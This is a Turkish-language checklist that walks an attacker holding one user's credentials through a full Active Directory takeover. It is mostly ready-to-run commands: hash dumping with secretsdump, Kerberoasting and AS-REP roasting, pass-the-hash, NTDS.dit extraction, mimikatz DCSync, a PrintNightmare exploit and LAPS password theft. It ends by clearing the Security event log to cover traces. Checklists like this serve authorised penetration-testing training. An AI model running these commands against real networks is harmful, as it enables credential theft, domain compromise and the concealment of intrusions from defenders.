# Active Directory Pentest Checklist

Bu belge, bir Active Directory ortamında pentest gerçekleştiren saldırganlar için kapsamlı bir kontrol listesi sunar. Senaryo, elinizde bir kullanıcının kimlik bilgileri (username ve password) olduğunu varsayar. Amaç, Domain Controller (DC) Admin hesabını ele geçirmektir.

---

## 1. Kimlik Bilgileri ile İlk Erişim Sağlama

### 1.1 Kullanıcı Doğrulama
```bash
# Kimlik bilgilerinin doğru olup olmadığını test et
crackmapexec smb <IP> -u <username> -p <password>
```
Açıklama: Kullanıcının bilgilerini SMB üzerinden doğrular. Eğer "[-] STATUS_LOGON_FAILURE" alıyorsanız bilgiler yanlış olabilir.

---

## 2. Kullanıcı Haklarını ve Gruplarını Kontrol Etme

### 2.1 Net Komutu ile Kullanıcı Bilgileri
```bash
# Kullanıcının gruplarını öğren
net user <username> /domain
```
Açıklama: Kullanıcının AD üzerindeki gruplarını listeler. Özellikle "Domain Admins" veya "Enterprise Admins" grubunda olup olmadığını kontrol edin.

### 2.2 BloodHound ile Hakları Analiz Etme
```bash
# BloodHound verilerini toplama
sharpHound.exe -c All -d <domain>
```
Açıklama: BloodHound, kullanıcıların haklarını ve ilişkilerini görselleştirir.

---

## 3. AD Hiyerarşisini ve Domain Bilgilerini Toplama

### 3.1 Domain Bilgilerini Al
```bash
# Domain bilgilerini al
whoami /all
```
Açıklama: Kullanıcının SID bilgisi ve haklarını kontrol eder.

### 3.2 DC Makinalarını Belirleme
```bash
# DC makinalarını bul
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
```
Açıklama: Domain Controller makinelerini listeler.

---

## 4. Dosya Paylaşımlarını Araştırma

### 4.1 SMB Paylaşımlarını Listeleme
```bash
# SMB paylaşımlarını kontrol et
smbclient -L //<IP> -U <username>%<password>
```
Açıklama: Hedef makinadaki paylaşımları listeler. Özellikle "SYSVOL" ve "NETLOGON" paylaşımını inceleyin.

### 4.2 Paylaşımı Mount Etme
```bash
# Paylaşımı mount et
smbclient //<IP>/<share_name> -U <username>%<password>
```
Açıklama: Paylaşılan dizinleri detaylı bir şekilde inceleyin.

---

## 5. Parola Politikalarını ve Hash'leri Toplama

### 5.1 Parola Politikalarını Öğrenme
```bash
# Parola politikalarını öğren
net accounts /domain
```
Açıklama: Parola uzunluğu ve süresi gibi politikaları kontrol eder.

### 5.2 Hash Dumplama
```bash
# Hash dumplama (impacket)
secretsdump.py <domain>/<username>:<password>@<IP>
```
Açıklama: Hedef makinedeki kullanıcıların hash'lerini çeker.

---

## 6. Yetki Yükseltme

### 6.1 Kerberoasting
```bash
# Kerberoasting yap
GetUserSPNs.py -request -dc-ip <DC_IP> <domain>/<username>:<password>
```
Açıklama: SPN kullanıcılarının hash'lerini toplar. Hashcat ile kırmayı deneyin.

### 6.2 ASREPRoasting
```bash
# ASREP roasting
GetNPUsers.py <domain>/<username>:<password> -dc-ip <DC_IP> -request
```
Açıklama: Kerberos pre-authentication disabled kullanıcılarını hedef alır.

### 6.3 Pass-the-Hash
```bash
# Pass-the-Hash saldırısı
pth-winexe -U <domain>/<username>%<NTLM_hash> //<IP> cmd.exe
```
Açıklama: Hash'i kullanarak hedef makineye bağlanır.

---

## 7. Domain Controller Erişimi

### 7.1 DC'deki Verileri Toplama
```bash
# NTDS.dit dosyasını alın
secretsdump.py -just-dc <domain>/<username>:<password>@<DC_IP>
```
Açıklama: DC üzerindeki tüm kullanıcıların hash'lerini elde eder.

### 7.2 DCSync Saldırısı
```bash
# DCSync ile hashleri alın
mimikatz
lsadump::dcsync /domain:<domain> /user:<username>
```
Açıklama: AD üzerindeki kullanıcıların hash'lerini doğrudan elde eder.

---

## 8. Ekstra İstismar Yöntemleri

### 8.1 Print Spooler Zafiyeti
```bash
# Print Spooler exploit
python3 cve-2021-1675.py <username>:<password>@<DC_IP>
```
Açıklama: PrintNightmare zafiyetini kullanarak DC'ye erişim sağlar.

### 8.2 LAPS Bilgilerini Okuma
```bash
# LAPS şifrelerini alın
lapspass.py <username>:<password>@<DC_IP>
```
Açıklama: LAPS tarafından korunan şifreleri elde eder.

---

## 9. İzleri Temizleme

### 9.1 Logları Temizleme
```bash
# Log temizleme (PowerShell)
Clear-EventLog -LogName Security
```
Açıklama: Hedef makinedeki logları temizler.

---

Bu liste düzenli olarak güncellenmeli ve kullanılan araçların dokümantasyonları okunmalıdır. Başarılar!
